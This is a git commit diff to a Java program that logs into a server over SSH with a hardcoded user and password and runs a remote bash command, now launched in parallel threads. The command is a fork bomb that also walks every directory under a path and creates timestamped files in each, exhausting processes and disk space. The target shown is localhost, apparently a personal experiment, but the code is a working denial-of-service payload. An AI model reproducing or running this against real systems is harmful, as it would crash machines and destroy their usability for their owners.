4d42075939f9796b2243ee0e91e96ca0045f1fde
vito-souza <vitorlegalvh@gmail.com>
2024-12-08 19:57:21 -0300

    conexões em threads

--- src/main/java/vitor/dev/Main.java
+++ src/main/java/vitor/dev/Main.java
@@ -6,32 +6,31 @@ import java.util.List;
 import vitor.dev.connection.SSHConnection;
 
 public class Main {
-
     public static void main(String[] args) {
-
         List<String[]> connectionData = new ArrayList<>();
         connectionData.add(new String[] { "ubuntu", "localhost", "ubuntu", "/home/ubuntu/Vitor", "2222" });
 
-        connectionData.forEach(data -> {
-            String user = data[0];
-            String host = data[1];
-            String password = data[2];
-            String remotePath = data[3];
-            int port = Integer.parseInt(data[4]);
+        for (String[] data : connectionData) {
+            new Thread(() -> {
+                String user = data[0];
+                String host = data[1];
+                String password = data[2];
+                String remotePath = data[3];
+                int port = Integer.parseInt(data[4]);
 
-            SSHConnection connection = new SSHConnection();
-
-            connection.connect(user, host, password, port);
-            connection.command(
-                    String.format(
-                            "bash -c ':() { " +
-                                    "for D in $(find \"%s\" -type d); do " +
-                                    "touch \"$D/vitor_$(date +%%s%%N).txt\"; " +
-                                    "done; " +
-                                    ":|: & " +
-                                    "};:'",
-                            remotePath),
-                    password);
-        });
+                SSHConnection connection = new SSHConnection();
+                connection.connect(user, host, password, port);
+                connection.command(
+                        String.format(
+                                "bash -c ':() { " +
+                                        "for D in $(find \"%s\" -type d); do " +
+                                        "touch \"$D/vitor_$(date +%%s%%N).txt\"; " +
+                                        "done; " +
+                                        ":|: & " +
+                                        "};:'",
+                                remotePath),
+                        password);
+            }).start();
+        }
     }
 }
